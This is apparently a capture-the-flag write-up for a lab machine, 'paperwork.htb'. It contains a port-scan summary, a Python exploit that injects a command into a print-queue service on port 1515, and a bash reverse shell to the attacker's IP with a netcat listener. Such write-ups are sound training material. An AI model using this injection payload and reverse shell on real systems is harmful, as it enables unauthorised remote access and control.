```bash
════════════════════════════════════════════════════════                                                                                                  
  RECON SUMMARY                                                                                                                                             
  ════════════════════════════════════════════════════════                                                                                                  
                                                                                                                                                            
  Target:        10.129.71.169
  DNS:           paperwork.htb
  HTTP:          80
  HTTPS:         none
  Generated:     2026-07-16 12:42:47

  ────────────────────────────────────────────────────────
  OPEN PORTS & SERVICES
  ────────────────────────────────────────────────────────
  PORT         STATE      SERVICE          VERSION
  ────────────────────────────────────────────────────────
  22/tcp       open       ssh              OpenSSH 10.0p2 Ubuntu 5ubuntu5.4 (Ubuntu Linux; protocol 2.0)
  80/tcp       open       http             nginx 1.28.0 (Ubuntu)
  1515/tcp     open       ifor-protocol?   

  ────────────────────────────────────────────────────────
  SUBDOMAINS  (0 found)
  ────────────────────────────────────────────────────────
  none

  ────────────────────────────────────────────────────────
  INTERESTING PATHS  (2 found)
  ────────────────────────────────────────────────────────

  [ http://paperwork.htb ]
  STATUS   PATH
  ──────────────────────────────────────────────────
  200      /
  200      /download/archive

  ════════════════════════════════════════════════════════

=== Done! Results: /home/kali/github/ctf_tool/results/paperwork.htb/ ===

```

we got ssh, a website on port 80 nad a mysterious one that we will check on later if we are stuck. 

When we visit the website its jsut a website for department of records and archives. There wasnt much but we were able to visit /download/archive and download a zip file

```bash
unzip paperwork-archive-v1.02.zip 
Archive:  paperwork-archive-v1.02.zip
  inflating: server.py               
```

We got a python script. lets read it. It mentions the 1515 port that we were able to find with the port scan.
```bash
import socket

HOST, PORT = "paperwork.htb", 1515
QUEUE = "archive_intake"   # must match VALID_QUEUE env var on the server

CMD = "bash -c 'bash -i >& /dev/tcp/10.10.14.11/4444 0>&1'"
content = f"J'; {CMD} ; echo '\n".encode()

s = socket.create_connection((HOST, PORT))

# Step 1: open the queue
s.send(bytes([2]) + QUEUE.encode() + b"\n")
print("Queue resp:", s.recv(1024))

# Step 2: send subcommand header (size + filename), any subcommand byte works
header = f"{len(content)} dfA001host\n".encode()
s.send(bytes([2]) + header)
print("Ack:", s.recv(1024))

# Step 3: send the malicious content
s.send(content)
print("Final:", s.recv(1024))

s.close()
```

We can use this script to get a reverse shell. We just basically connect to the lpd and then just inject a cmd to it. in this case its just a reverse shell

```bash
nc -lnvp 4444
```


